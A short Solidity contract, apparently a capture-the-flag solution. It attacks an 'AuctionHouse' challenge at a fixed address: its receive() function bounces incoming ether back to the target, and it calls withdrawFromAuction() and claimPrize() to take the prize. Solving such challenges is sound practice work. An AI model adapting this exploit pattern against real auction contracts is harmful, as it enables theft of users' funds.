// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import "./AuctionHouse.sol";


contract Contract{
        address payable public YOUR_CHALLENGE_CONTRACT_ADDRESS = payable(address(0x54F9109aEa062D4A992e64641D45B957688b3447));
	AuctionHouse public creature = AuctionHouse(YOUR_CHALLENGE_CONTRACT_ADDRESS);

	receive() external payable {
	//function attack2(uint256 amount) payable external {
		//creature.transfer(value);
		YOUR_CHALLENGE_CONTRACT_ADDRESS.call{value: msg.value}("");
        }


	function withdraw() external {
		creature.withdrawFromAuction();
	}

	function claim() external {
                creature.claimPrize();
        }


}

